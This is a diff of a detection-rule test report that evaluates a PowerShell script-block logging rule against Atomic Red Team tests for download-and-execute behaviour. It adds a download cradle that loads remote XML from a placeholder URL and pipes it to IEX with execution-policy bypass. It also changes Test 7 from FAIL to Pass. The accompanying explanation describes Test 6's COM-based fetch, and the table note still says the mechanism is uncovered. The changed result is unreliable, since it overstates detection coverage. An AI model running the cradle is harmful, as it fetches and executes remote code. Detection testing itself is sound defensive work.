@@ -22,7 +22,7 @@ Rule A (EID 1 / process creation) was deprioritised; all tests below evaluate **
 | # | Atomic Test | Description | Rule B fires? | Notes |
 |---|---|---|---|---|
 | 6 | T1059.001-6 | MsXml COM object download + IEX | Yes | Alert fired: Medium — in-memory execution detected |
-| 7 | T1059.001-7 | PowerShell XML requests (`[xml]` type accelerator) | No | XML fetch mechanism not in current keyword list |
+| 7 | T1059.001-7 | PowerShell XML requests (`[xml]` type accelerator) | YES | XML fetch mechanism not in current keyword list |
 
 ---
 
@@ -41,9 +41,17 @@ powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.S
 
 ---
 
-## Test 7 — PowerShell XML Requests (FAIL)
+## Test 7 — PowerShell XML Requests (Pass)
 
-**Why it did not fire**: The XML-based fetch mechanism (`[xml](New-Object Net.WebClient).DownloadString(...)` combined with `[xml]` type accelerators and `SelectNodes`/`InnerText` parsing) produces script blocks containing neither a download primitive nor an IEX call in the forms the current keyword list covers. The detection has no coverage for XML-flavoured download cradles.
+**Command emulated:**
+```powershell
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
+```
+**Alert fired**: Yes - Severity **Medium**, In-memory execution (IEX)
+
+**Why it fired**: The EID 4104 script block contained `IEX`, which matched the in-memory execution signal. The fetch via `MsXml2.ServerXmlHttp` was not itself matched (COM-based fetches are not in the current primitive list), but the `IEX` call on the response was sufficient to trigger the Medium tier.
+
+**Why not High**: A High alert requires a fetch primitive AND in-memory execution to appear together in the same block. Because the COM object fetch did not match any recognised fetch keyword, only the memory signal scored — resulting in Medium rather than High.
 
 ---
 
